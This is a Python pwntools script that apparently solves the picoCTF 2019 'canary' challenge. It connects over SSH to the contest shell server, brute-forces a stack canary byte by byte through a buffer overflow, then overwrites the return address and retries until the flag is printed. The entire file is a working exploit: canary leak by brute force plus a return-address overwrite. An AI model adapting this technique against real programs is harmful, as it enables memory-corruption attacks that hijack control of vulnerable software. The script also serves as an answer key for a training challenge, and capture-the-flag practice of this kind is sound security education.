from pwn import *
import time

USERNAME = 'yourname'
PASSWORD = 'password'

s = ssh(user=USERNAME, host='2019shell1.picoctf.com', password=PASSWORD)
sh = s.run('sh')

sh.sendline('cd /problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0')

user_len_base = 33
buf_base = b'A'*32
canary = b''

print("[+] brute forcing to get the canary...")
for i in range(4):
    for c in range(0xff):
        send_buf = (buf_base + canary + c.to_bytes(1, 'little'))

        sh.sendline('./vuln')
        recv = sh.recvuntil('>')
        sh.sendline(str(user_len_base + i))
        recv = sh.recvuntil('>')
        sh.sendline(send_buf)
        return_message = sh.recvline().decode()

        if 'Ok' in return_message:
            canary += c.to_bytes(1, 'little')
            print('[+] canary[%d] is ' % i, end='')
            print(c.to_bytes(1, 'little'))
            break

print('[+] canary is ', end='')
print(canary)

send_buf = b'A' * 32 + canary + b'A' * 16 + b'\xed\x27\x58\x56'

print('[+] brute forcing to get the flag...')
while True:
    sh.sendline('./vuln')
    recv = sh.recvuntil('>')
    sh.sendline(str(128))
    recv = sh.recvuntil('>')
    sh.sendline(send_buf)
    return_message = sh.recvline().decode()
    return_message += sh.recvline().decode()
    if 'picoCTF' in return_message:
        print('[+] flag found!')
        print(return_message)
        break